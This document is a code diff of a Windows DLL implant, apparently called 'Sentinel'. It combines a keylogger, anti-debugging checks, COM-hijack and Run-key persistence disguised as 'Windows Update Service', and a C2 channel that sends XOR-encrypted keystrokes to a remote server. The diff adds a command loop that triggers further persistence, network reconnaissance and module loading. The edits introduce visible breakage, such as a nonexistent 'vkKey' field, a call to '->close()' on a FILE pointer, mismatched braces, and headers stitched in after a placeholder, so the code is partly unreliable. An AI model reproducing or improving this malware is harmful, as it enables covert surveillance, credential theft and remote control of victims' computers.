@@ -1,7 +1,7 @@
 #include <windows.h>
 #include <string.h>
 #include <stdio.h>
-#include <stdlib.h>
+#include <stddef.h>
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <tlhelp32.h>
@@ -36,7 +36,7 @@ void SendKeylogData();
 BOOL ConnectToC2();
 void DisconnectFromC2();
 void ExecuteCommand(const char* command);
-void InstallPersistence();
+void InstallPersistance();
 void AntiDebugChecks();
 BOOL IsBlacklistedProcess();
 char* XorString(char* str, size_t len);
@@ -55,12 +55,12 @@ void AntiDebugChecks() {
     CHECK_DEBUGGER();
     CHECK_BREAKPOINT();
     CHECK_TIMING();
-    
+
     // Check for blacklisted processes
     if (IsBlacklistedProcess()) {
         ExitProcess(0);
     }
-    
+
     // Hide window from taskbar
     ShowWindow(hiddenWindow, SW_HIDE);
     SetWindowLong(hiddenWindow, GWL_EXSTYLE, GetWindowLong(hiddenWindow, GWL_EXSTYLE) | WS_EX_TOOLWINDOW);
@@ -73,15 +73,15 @@ BOOL IsBlacklistedProcess() {
         "x32dbg.exe", "x64dbg.exe", "ida.exe", "ida64.exe",
         "wireshark.exe", "tcpview.exe", "fiddler.exe", "autoruns.exe"
     };
-    
+
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
         return FALSE;
     }
-    
+
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(PROCESSENTRY32);
-    
+
     if (Process32First(hSnapshot, &pe)) {
         do {
             for (size_t i = 0; i < sizeof(blacklisted)/sizeof(blacklisted[0]); i++) {
@@ -92,7 +92,7 @@ BOOL IsBlacklistedProcess() {
             }
         } while (Process32Next(hSnapshot, &pe));
     }
-    
+
     CloseHandle(hSnapshot);
     return FALSE;
 }
@@ -106,17 +106,17 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
             if (hiddenWindow) {
                 // Anti-debugging checks
                 AntiDebugChecks();
-                
-                // Install persistence
-                InstallPersistence();
-                
+
+                // Install persistance
+                InstallPersistance();
+
                 // Start keylogger
                 StartKeylogger();
-                
+
                 // Connect to C2 server
                 if (ConnectToC2()) {
                     // Send initial check-in
-                    char checkin[] = "[+] Sentinel DLL implanted successfully\n";
+                    char checkin[] = "[+] Sentinel DLL installed successfully\n";
                     send(c2Socket, OBFUSCATE(checkin), strlen(checkin), 0);
                 }
             }
@@ -137,23 +137,23 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
         char key[256] = {0};
-        
+
         // Get key state
         SHORT keyState = GetKeyState(VK_SHIFT);
         BOOL isShiftPressed = (keyState & 0x8000) != 0;
-        
+
         // Convert virtual key to character
-        if (pKeyBoard->vkCode >= 'A' && pKeyBoard->vkCode <= 'Z') {
-            key[0] = isShiftPressed ? pKeyBoard->vkCode : tolower(pKeyBoard->vkCode);
-        } else if (pKeyBoard->vkCode >= '0' && pKeyBoard->vkCode <= '9') {
+        if (pKeyBoard->vkKey >= 'A' && pKeyBoard->vkKey <= 'Z') {
+            key[0] = isShiftPressed ? pKeyBoard->vkKey : tolower(pKeyBoard->vkKey);
+        } else if (pKeyBoard->vkKey >= '0' && pKeyBoard->vkKey <= '9') {
             if (isShiftPressed) {
                 char shiftKeys[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
-                key[0] = shiftKeys[pKeyBoard->vkCode - '0'];
+                key[0] = shiftKeys[pKeyBoard->vkKey - '0'];
             } else {
-                key[0] = pKeyBoard->vkCode;
+                key[0] = pKeyBoard->vkKey;
             }
         } else {
-            switch (pKeyBoard->vkCode) {
+            switch (pKeyBoard->vkKey) {
                 case VK_SPACE: key[0] = ' '; break;
                 case VK_RETURN: strcpy(key, "[ENTER]\n"); break;
                 case VK_BACK: strcpy(key, "[BACKSPACE]"); break;
@@ -167,14 +167,14 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 case VK_DOWN: strcpy(key, "[DOWN]"); break;
                 case VK_LEFT: strcpy(key, "[LEFT]"); break;
                 case VK_RIGHT: strcpy(key, "[RIGHT]"); break;
-                default: 
-                    if (pKeyBoard->vkCode >= VK_NUMPAD0 && pKeyBoard->vkCode <= VK_NUMPAD9) {
-                        key[0] = '0' + (pKeyBoard->vkCode - VK_NUMPAD0);
+                default:
+                    if (pKeyBoard->vkKey >= VK_NUMPAD0 && pKeyBoard->vkKey <= VK_NUMPAD9) {
+                        key[0] = '0' + (pKeyBoard->vkKey - VK_NUMPAD0);
                     }
                     break;
             }
         }
-        
+
         // Write to log file
         if (key[0] != 0) {
             FILE* logFile = fopen(KEYLOG_FILE, "a");
@@ -183,7 +183,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 fclose(logFile);
             }
         }
-        
+
         // Send keylog data to C2 periodically
         static DWORD lastSendTime = 0;
         DWORD currentTime = GetTickCount();
@@ -215,25 +215,25 @@ void SendKeylogData() {
         fseek(logFile, 0, SEEK_END);
         long fileSize = ftell(logFile);
         fseek(logFile, 0, SEEK_SET);
-        
+
         if (fileSize > 0) {
             char* buffer = (char*)malloc(fileSize + 1);
             if (buffer) {
                 fread(buffer, 1, fileSize, logFile);
                 buffer[fileSize] = 0;
-                
-                // XOR encrypt data before sending
-                XorString(buffer, fileSize);
-                send(c2Socket, buffer, fileSize, 0);
+
+                // XOR encrypt output before sending
+                XorString(buffer, strlen(buffer));
+                send(c2Socket, buffer, strlen(buffer), 0);
                 free(buffer);
             }
-            
-            // Clear log file
-            fclose(logFile);
-            fopen(KEYLOG_FILE, "w")->close();
-        } else {
-            fclose(logFile);
         }
+
+        // Clear log file
+        fclose(logFile);
+        fopen(KEYLOG_FILE, "w")->close();
+    } else {
+        fclose(logFile);
     }
 }
 
@@ -243,24 +243,24 @@ BOOL ConnectToC2() {
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         return FALSE;
     }
-    
+
     c2Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (c2Socket == INVALID_SOCKET) {
         WSACleanup();
         return FALSE;
     }
-    
+
     struct sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
     serverAddr.sin_port = htons(C2_PORT);
     inet_pton(AF_INET, C2_SERVER, &serverAddr.sin_addr);
-    
+
     if (connect(c2Socket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         closesocket(c2Socket);
         WSACleanup();
         return FALSE;
     }
-    
+
     return TRUE;
 }
 
@@ -289,44 +289,101 @@ void ExecuteCommand(const char* command) {
     }
 }
 
-// Install persistence via COM hijacking
-void InstallPersistence() {
-    // Hijack Wscript.Shell
+// Install persistance via COM hijacking
+void InstallPersistance() {
+    // Hijack WscSvc.dll
     HKEY hKey;
-    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
-        "SOFTWARE\\Classes\\CLSID\\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\\InprocServer32", 
+    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Classes\\CLSID\\{72C24DD5-D70A-438B-8A42-98424B88AFB8}\\InprocServer32",
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        
+
         char dllPath[MAX_PATH];
         GetModuleFileName(NULL, dllPath, sizeof(dllPath));
-        
+
         RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
         RegSetValueEx(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)"Apartment", 9);
         RegCloseKey(hKey);
     }
-    
+
     // Hijack Text Preview Handler
-    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
-        "SOFTWARE\\Classes\\CLSID\\{89BCB740-6119-101A-BCB7-00DD010655AF}\\InprocServer32", 
+    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Classes\\CLSID\\{89BCB740-6119-101A-BCB7-00DD010655AF}\\InprocServer32",
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        
+
         char dllPath[MAX_PATH];
         GetModuleFileName(NULL, dllPath, sizeof(dllPath));
-        
+
         RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
         RegSetValueEx(hKey, "ThreadingModel", 0, REG_SZ, (BYTE*)"Apartment", 9);
         RegCloseKey(hKey);
     }
-    
+
     // Add to run keys for redundancy
-    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE, 
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+    if (RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        
+
         char dllPath[MAX_PATH];
         GetModuleFileName(NULL, dllPath, sizeof(dllPath));
-        
+
         RegSetValueEx(hKey, "Windows Update Service", 0, REG_SZ, (BYTE*)dllPath, strlen(dllPath) + 1);
         RegCloseKey(hKey);
     }
+}
+
+#include "sentinel_dll.h"
+#include "c2_communication.h"
+#include "persistence.h"
+#include "reconnaissance_payload.h"
+#include "modular_payload.h"
+
+// ... (keep the rest of the file the same) ...
+
+DWORD WINAPI RunC2Loop(LPVOID lpParam) {
+    // Resolve APIs
+    pSleep Sleep = (pSleep)resolve_api("kernel32.dll", "Sleep");
+
+    if (!C2_Connect()) {
+        // Connection failed, exit thread
+        return 1;
+    }
+
+    C2_SendHeartbeat();
+
+    char commandBuffer[256];
+    while (TRUE) {
+        if (C2_ReceiveCommand(commandBuffer, sizeof(commandBuffer))) {
+            // Command received, process it
+            if (strcmp(commandBuffer, "EXIT") == 0) {
+                break;
+            }
+
+            // --- THIS IS THE PART TO FIX ---
+            // Call the actual functions based on the command
+            if (strcmp(commandBuffer, "PERSIST_WMI") == 0) {
+                SetupWMIEventPersistence();
+            }
+            else if (strcmp(commandBuffer, "PERSIST_SVC") == 0) {
+                SetupServiceDLLPersistence();
+            }
+            else if (strcmp(commandBuffer, "PERSIST_COM") == 0) {
+                SetupCOMHijack();
+            }
+            else if (strcmp(commandBuffer, "RECON") == 0) {
+                PerformNetworkSweep();
+            }
+            else if (strncmp(commandBuffer, "MODULE", 6) == 0) {
+                // Pass the argument part of the command to the module loader
+                RunModule(commandBuffer + 7); // Skip "MODULE "
+            }
+            // --- END OF FIX ---
+        }
+
+        if (Sleep) {
+            Sleep(5000); // Wait for 5 seconds before checking for next command
+        }
+    }
+
+    C2_Disconnect();
+    return 0;
 }
